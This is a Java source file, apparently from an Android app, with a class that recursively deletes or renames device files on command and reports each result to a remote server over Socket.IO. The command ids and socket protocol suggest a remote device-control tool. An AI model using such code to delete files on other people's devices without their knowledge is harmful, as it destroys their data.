package com.fason.app.features.storage;

import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import org.json.JSONObject;
import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import io.socket.client.Socket;

public final class FileModify {
    private static final ExecutorService exec = Executors.newSingleThreadExecutor();

    private FileModify() {}
    public static void delete(String path, String cmdId) {
        exec.execute(() -> {
            boolean ok = false;
            String err = null;
            try {
                if (path == null || path.isEmpty()) throw new IllegalArgumentException("No path");
                File f = FileManager.safeFile(path);
                if (f == null) throw new IllegalArgumentException("Invalid or forbidden path");
                if (!f.exists()) throw new IllegalArgumentException("Not found");
                ok = deleteRecursive(f);
                if (!ok) err = "Delete failed";
            } catch (Exception e) {
                err = e.getMessage();
            }
            emitResult("delete", path, ok, err, cmdId);
        });
    }

    public static void rename(String path, String newName, String cmdId) {
        exec.execute(() -> {
            boolean ok = false;
            String err = null;
            try {
                if (path == null || path.isEmpty()) throw new IllegalArgumentException("No path");
                File src = FileManager.safeFile(path);
                if (src == null) throw new IllegalArgumentException("Invalid or forbidden path");
                if (!src.exists()) throw new IllegalArgumentException("Not found");
                if (newName == null || newName.isEmpty()) throw new IllegalArgumentException("No new name");
                if (newName.contains("/"))
                    throw new IllegalArgumentException("New name must not contain path separators");
                File parent = src.getParentFile();
                if (parent == null) throw new IllegalArgumentException("Cannot rename root");
                File dst = new File(parent, newName);
                ok = src.renameTo(dst);
                if (!ok) err = "Rename failed";
            } catch (Exception e) {
                err = e.getMessage();
            }
            emitResult("rename", path, ok, err, cmdId);
        });
    }

    private static boolean deleteRecursive(File f) {
        if (f.isDirectory()) {
            File[] children = f.listFiles();
            if (children != null) {
                for (File c : children) {
                    if (!deleteRecursive(c)) return false;
                }
            }
        }
        return f.delete();
    }

    private static void emitResult(String action, String path, boolean success, String error, String cmdId) {
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null) return;
        try {
            JSONObject r = new JSONObject();
            r.put("type", "modify_result");
            r.put(Protocol.KEY_ACTION, action);
            r.put(Protocol.KEY_PATH, path);
            r.put(Protocol.KEY_SUCCESS, success);
            if (error != null) r.put(Protocol.KEY_ERROR, error);
            if (cmdId != null && !cmdId.isEmpty()) r.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.FILES, r);
        } catch (Exception ignored) {}
    }
}
